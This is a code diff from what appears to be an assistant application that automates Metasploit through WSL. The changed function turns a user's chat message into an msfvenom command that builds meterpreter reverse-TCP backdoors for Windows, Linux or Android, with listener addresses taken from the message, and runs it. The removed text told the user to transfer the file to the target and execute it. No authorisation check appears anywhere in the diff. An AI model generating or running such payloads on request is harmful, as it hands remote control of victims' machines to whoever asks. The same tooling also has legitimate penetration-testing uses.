@@ -1066,20 +1066,24 @@ General Requirements:
         auto_fix: bool = True,
     ) -> tuple[int, str]:
         """
-        Execute a Metasploit command and capture output.
+        Execute a Metasploit command via WSL.
 
         Args:
-            command: Metasploit command to execute
+            command: Metasploit command to execute (msfvenom, msfconsole, etc.)
             show_terminal: Whether to show terminal window
             timeout: Command timeout in seconds
             auto_fix: Whether to attempt autonomous fixes for common errors
 
         Returns:
-            Tuple of (exit_code, output)
+            Tuple of (exit_code, output_string)
         """
         from spectral.knowledge import diagnose_error
 
-        logger.info(f"Executing Metasploit command: {command[:100]}")
+        # Prepend 'wsl' to route command to Ubuntu/WSL
+        if not command.startswith("wsl "):
+            command = f"wsl {command}"
+
+        logger.info(f"Executing Metasploit command via WSL: {command[:100]}")
 
         # Emit GUI event for command start
         self._emit_gui_event(
@@ -1420,62 +1424,93 @@ General Requirements:
     def _generate_metasploit_payload(
         self, user_message: str, knowledge_base: Optional[Dict] = None
     ) -> str:
-        """Generate actual Metasploit payload with msfvenom.
+        """Generate a Metasploit payload using msfvenom via WSL.
 
         Args:
-            user_message: The user's request
-            knowledge_base: Optional Metasploit knowledge base
+            user_message: User's request for payload
+            knowledge_base: Metasploit knowledge context
 
         Returns:
-            Formatted response with payload generation results
+            Response with payload details or error
         """
-        import os
-        from datetime import datetime
+        logger.info(f"Generating Metasploit payload via WSL for: {user_message}")
 
-        # Extract target info from user message or ask for it
-        # For now, example: "create payload for Windows 10 192.168.1.100"
-        lhost = "192.168.1.X"  # Get local IP
-        lport = "4444"  # Use default or ask
+        # Parse payload requirements from user message
+        # Example: "Windows x86 reverse shell with LHOST 192.168.1.100 LPORT 4444"
 
-        # Build msfvenom command
-        payload = "windows/meterpreter/reverse_tcp"
-        output_file = os.path.expanduser(
-            f"~\\Desktop\\payload_{datetime.now().strftime('%Y%m%d_%H%M%S')}.exe"
-        )
+        try:
+            # Determine payload type and options
+            payload_type = "windows/meterpreter/reverse_tcp"
+            lhost = "192.168.1.100"
+            lport = "4444"
+            format_type = "exe"
 
-        cmd = f'msfvenom -p {payload} LHOST={lhost} LPORT={lport} -f exe -o "{output_file}"'
+            # Extract from user message if provided
+            if "linux" in user_message.lower():
+                payload_type = "linux/x64/meterpreter/reverse_tcp"
+                format_type = "elf"
+            elif "android" in user_message.lower() or "apk" in user_message.lower():
+                payload_type = "android/meterpreter/reverse_tcp"
+                format_type = "apk"
 
-        # Execute command in visible terminal
-        exit_code, result = self.execute_metasploit_command(
-            command=cmd, show_terminal=True, timeout=120, auto_fix=True
-        )
+            # Extract LHOST and LPORT if provided
+            import re
 
-        if exit_code == 0:
-            return f"""
-    ✅ Payload generated successfully!
+            lhost_match = re.search(r"LHOST[=:\s]+(\d+\.\d+\.\d+\.\d+)", user_message)
+            if lhost_match:
+                lhost = lhost_match.group(1)
 
-    Command executed:
-    {cmd}
+            lport_match = re.search(r"LPORT[=:\s]+(\d+)", user_message)
+            if lport_match:
+                lport = lport_match.group(1)
 
-    Output:
-    {result}
+            # Generate output filename
+            from datetime import datetime
 
-    Payload saved to: {output_file}
+            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+            output_file = f"C:\\Users\\aubrey martin\\Desktop\\payload_{timestamp}.{format_type}"
 
-    Next step: Transfer this file to your target and execute it.
-    """
-        else:
-            return f"""
-    ❌ Payload generation failed!
+            # Build msfvenom command
+            cmd = (
+                f"msfvenom -p {payload_type} "
+                f"LHOST={lhost} LPORT={lport} "
+                f'-f {format_type} -o "{output_file}"'
+            )
 
-    Command:
-    {cmd}
+            logger.info(f"Running: {cmd}")
 
-    Error:
-    {result}
+            # Execute via WSL (execute_metasploit_command adds 'wsl' prefix)
+            exit_code, output = self.execute_metasploit_command(
+                cmd, show_terminal=True, timeout=120
+            )
 
-    Please check the error and try again.
-    """
+            if exit_code == 0:
+                response = (
+                    f"✅ Payload generated successfully!\n\n"
+                    f"**Payload Details:**\n"
+                    f"- Type: {payload_type}\n"
+                    f"- LHOST: {lhost}\n"
+                    f"- LPORT: {lport}\n"
+                    f"- Format: {format_type}\n"
+                    f"- Output: {output_file}\n\n"
+                    f"**Command:**\n```\n{cmd}\n```\n\n"
+                    f"**Output:**\n```\n{output}\n```"
+                )
+                logger.info(f"Payload generation succeeded: {output_file}")
+                return response
+            else:
+                response = (
+                    f"❌ Payload generation failed!\n\n"
+                    f"**Error:**\n{output}\n\n"
+                    f"**Command:**\n```\n{cmd}\n```"
+                )
+                logger.error(f"Payload generation failed: {output}")
+                return response
+
+        except Exception as e:
+            error_msg = f"Exception during payload generation: {str(e)}"
+            logger.error(error_msg)
+            return f"❌ Error: {error_msg}"
 
     def _setup_metasploit_listener(
         self, user_message: str, knowledge_base: Optional[Dict] = None
